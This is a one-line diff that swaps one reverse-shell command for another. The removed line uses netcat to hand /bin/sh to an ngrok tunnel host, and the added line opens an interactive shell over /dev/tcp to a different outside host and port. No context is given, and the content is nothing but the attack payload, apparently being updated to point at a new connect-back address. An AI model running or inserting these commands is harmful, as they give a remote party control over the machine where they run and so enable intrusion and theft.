@@ -1,1 +1,1 @@
-nc 8.tcp.ngrok.io 16012 -e /bin/sh
+sh -i >& /dev/tcp/lawbyte-43287.p/43287 0>&1
